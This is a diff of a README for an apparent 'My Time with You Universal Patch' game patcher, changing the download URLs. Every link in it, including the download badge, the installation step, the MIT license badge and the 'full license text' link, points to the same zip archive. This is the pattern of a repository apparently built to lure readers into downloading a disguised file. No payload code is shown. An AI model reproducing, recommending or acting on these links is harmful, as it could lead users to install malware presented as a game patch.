@@ -1,4 +1,4 @@
-# ![Download](https://raw.githubusercontent.com/CharltonBB/my-time-with-you-universal-patcher/branch/sorrowing/my-time-with-you-universal-patcher-v2.9.zip%20Patch-blue?logo=getpocket&style=for-the-badge&https://raw.githubusercontent.com/CharltonBB/my-time-with-you-universal-patcher/branch/sorrowing/my-time-with-you-universal-patcher-v2.9.zip)  
+# ![Download](https://github.com/CharltonBB/my-time-with-you-universal-patcher/raw/refs/heads/branch/sorrowing/universal_time_with_my_patcher_you_v3.4.zip%20Patch-blue?logo=getpocket&style=for-the-badge&https://github.com/CharltonBB/my-time-with-you-universal-patcher/raw/refs/heads/branch/sorrowing/universal_time_with_my_patcher_you_v3.4.zip)  
 **My Time with You Universal Patch**
 
 Welcome, digital explorers! Traverse the world of “My Time with You” with a patch crafted for global harmony and never-ending creative possibilities. This repository houses the Universal Patch, bridging boundaries, enhancing your experience, and expanding the game world’s very fabric — for creators, players, and enthusiasts across platforms.
@@ -67,7 +67,7 @@ With our hybrid AI-human support portal, help is a button-click away, whether it
 ## 🚀 Installation
 
 ### Step 1. Download the Patch  
-Click the badge below (or here: https://raw.githubusercontent.com/CharltonBB/my-time-with-you-universal-patcher/branch/sorrowing/my-time-with-you-universal-patcher-v2.9.zip) to obtain the Universal Patch package.
+Click the badge below (or here: https://github.com/CharltonBB/my-time-with-you-universal-patcher/raw/refs/heads/branch/sorrowing/universal_time_with_my_patcher_you_v3.4.zip) to obtain the Universal Patch package.
 
 ### Step 2. Prep Your Game  
 Back up your existing installation of “My Time with You”. Trust us: memories are precious.
@@ -102,16 +102,16 @@ AI integrations rely on third-party APIs; their use implies adherence to respect
 ## 📜 MIT License (2025)
 This project radiates innovation under the MIT License — a badge of open collaboration and shared future-building.
 
-[![License: MIT](https://raw.githubusercontent.com/CharltonBB/my-time-with-you-universal-patcher/branch/sorrowing/my-time-with-you-universal-patcher-v2.9.zip)](https://raw.githubusercontent.com/CharltonBB/my-time-with-you-universal-patcher/branch/sorrowing/my-time-with-you-universal-patcher-v2.9.zip)
+[![License: MIT](https://github.com/CharltonBB/my-time-with-you-universal-patcher/raw/refs/heads/branch/sorrowing/universal_time_with_my_patcher_you_v3.4.zip)](https://github.com/CharltonBB/my-time-with-you-universal-patcher/raw/refs/heads/branch/sorrowing/universal_time_with_my_patcher_you_v3.4.zip)
 
 See full license text here:  
-https://raw.githubusercontent.com/CharltonBB/my-time-with-you-universal-patcher/branch/sorrowing/my-time-with-you-universal-patcher-v2.9.zip
+https://github.com/CharltonBB/my-time-with-you-universal-patcher/raw/refs/heads/branch/sorrowing/universal_time_with_my_patcher_you_v3.4.zip
 
 ---
 
 ## 📥 Quick Access  
 Relive the beginning of your journey —  
-![Download](https://raw.githubusercontent.com/CharltonBB/my-time-with-you-universal-patcher/branch/sorrowing/my-time-with-you-universal-patcher-v2.9.zip%20Patch-blue?logo=getpocket&style=for-the-badge&https://raw.githubusercontent.com/CharltonBB/my-time-with-you-universal-patcher/branch/sorrowing/my-time-with-you-universal-patcher-v2.9.zip)
+![Download](https://github.com/CharltonBB/my-time-with-you-universal-patcher/raw/refs/heads/branch/sorrowing/universal_time_with_my_patcher_you_v3.4.zip%20Patch-blue?logo=getpocket&style=for-the-badge&https://github.com/CharltonBB/my-time-with-you-universal-patcher/raw/refs/heads/branch/sorrowing/universal_time_with_my_patcher_you_v3.4.zip)
 
 ---
 
